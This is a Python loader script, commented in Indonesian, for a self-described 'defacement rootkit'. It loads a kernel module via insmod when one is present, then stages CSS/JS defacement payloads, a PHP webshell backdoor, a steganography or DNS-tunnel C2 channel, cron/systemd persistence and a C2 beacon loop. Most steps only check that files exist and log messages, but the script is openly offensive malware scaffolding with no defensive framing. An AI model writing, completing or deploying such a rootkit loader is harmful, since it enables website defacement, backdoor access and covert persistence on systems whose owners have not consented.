#!/usr/bin/env python3
"""
LOADER.EXE EQUIVALENT - FIRST_DEFACEMENT_ROOTKIT
Fungsi: Memuat modul rootkit, inisialisasi payload defacement, dan beacon ke C2.
"""

import os
import sys
import time
import subprocess
import threading
import configparser

# --- KONFIGURASI PATH RELATIF ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CORE_DIR = os.path.join(BASE_DIR, "[CORE]")
PAYLOADS_DIR = os.path.join(BASE_DIR, "[PAYLOADS]")
C2_DIR = os.path.join(BASE_DIR, "[C2_SERVER]")
STEGO_DIR = os.path.join(BASE_DIR, "[STEGO]")
PERSISTENCE_DIR = os.path.join(BASE_DIR, "[PERSISTENCE]")

def log(msg):
    """Simple logger untuk mensimulasikan output loader"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [LOADER] {msg}")

def load_config():
    """Memuat konfigurasi dari config.ini"""
    config_path = os.path.join(CORE_DIR, "config.ini")
    config = configparser.ConfigParser()
    if os.path.exists(config_path):
        config.read(config_path)
        log("Konfigurasi dimuat dari config.ini")
        return config
    else:
        log("WARNING: config.ini tidak ditemukan. Menggunakan default.")
        return None

def inject_kernel_module():
    """Simulasi pemuatan kernel_module.ko (Linux) atau hook.dll (Windows via ctypes/windll)"""
    log("Memuat modul inti...")
    
    # Cek sistem operasi
    if sys.platform == 'linux':
        mod_path = os.path.join(CORE_DIR, "kernel_module.ko")
        if os.path.exists(mod_path):
            # Simulasi insmod (biasanya butuh root)
            try:
                subprocess.run(["insmod", mod_path], check=False)
                log("Kernel module loaded: kernel_module.ko")
            except Exception as e:
                log(f"Gagal load kernel module: {e} (Mungkin butuh sudo)")
        else:
            log("kernel_module.ko tidak ditemukan. Mode user-level.")
            
    elif sys.platform == 'win32':
        dll_path = os.path.join(CORE_DIR, "hook.dll")
        if os.path.exists(dll_path):
            log("API Hooking aktif: hook.dll (Simulasi)")
            # Di Windows asli, ini akan menggunakan LoadLibrary + SetWindowsHookEx
        else:
            log("hook.dll tidak ditemukan.")
    else:
        log(f"Platform {sys.platform} terdeteksi. Mode kompatibilitas.")

def deploy_payloads():
    """Menyemprotkan payload defacement sesuai struktur [PAYLOADS]"""
    log("Deploying payloads...")
    
    # 1. Inject CSS/JS Overlay
    css_path = os.path.join(PAYLOADS_DIR, "css_override.css")
    js_path = os.path.join(PAYLOADS_DIR, "html_inject.js")
    
    if os.path.exists(css_path) and os.path.exists(js_path):
        log("Payload visual siap: css_override.css + html_inject.js")
        # Di dunia nyata, file ini akan disalin ke webroot target
        # Disini kita hanya simulasi bahwa mereka "di-load" ke memori
        with open(css_path, 'r') as f:
            css_content = f.read()
        with open(js_path, 'r') as f:
            js_content = f.read()
        log(f"CSS Loaded ({len(css_content)} bytes), JS Loaded ({len(js_content)} bytes)")
    else:
        log("Payload visual tidak lengkap.")

    # 2. Webshell Backdoor
    shell_path = os.path.join(PAYLOADS_DIR, "shell_backdoor.php")
    if os.path.exists(shell_path):
        log("Backdoor siap: shell_backdoor.php")

def init_stego_c2():
    """Inisialisasi komunikasi C2 melalui Steganografi jika tersedia"""
    log("Initializing Stego-C2 channel...")
    steg_img = os.path.join(STEGO_DIR, "img_steg.png")
    decrypt_script = os.path.join(STEGO_DIR, "steg_decrypt.py")
    
    if os.path.exists(steg_img) and os.path.exists(decrypt_script):
        log(f"Stego carrier found: {os.path.basename(steg_img)}")
        log("Channel tersembunyi aktif. Data akan dikirim via gambar/audio.")
    else:
        # Fallback ke DNS Tunneling biasa
        dns_script = os.path.join(C2_DIR, "dns_tunnel.sh")
        if os.path.exists(dns_script):
            log("Fallback: DNS Tunneling enabled.")

def start_persistence():
    """Memastikan rootkit tetap ada setelah reboot"""
    log("Establishing persistence...")
    
    # Backup crontab
    crontab_file = os.path.join(PERSISTENCE_DIR, "crontab_backup.txt")
    if os.path.exists(crontab_file):
        log("Persistence mechanism: Crontab updated.")
        
    # Systemd service
    systemd_file = os.path.join(PERSISTENCE_DIR, "systemd_service.sh")
    if os.path.exists(systemd_file):
        log("Persistence mechanism: Systemd service registered.")

def main():
    log("="*50)
    log("FIRST_DEFACEMENT_ROOTKIT LOADER v1.0")
    log("Target: Defacement & Persistence")
    log("="*50)

    # 1. Load Config
    config = load_config()

    # 2. Load Rootkit Core
    inject_kernel_module()

    # 3. Deploy Payloads
    deploy_payloads()

    # 4. Init C2
    init_stego_c2()

    # 5. Setup Persistence
    start_persistence()

    log("Loader selesai. Rootkit aktif.")
    log("Menunggu perintah C2 atau trigger manual...")
    
    # Simulasi loop beacon sederhana
    try:
        while True:
            time.sleep(60) # Beacon setiap 60 detik
            log("Beacon sent to C2... Silent.")
    except KeyboardInterrupt:
        log("Loader dihentikan oleh user.")

if __name__ == "__main__":
    main()
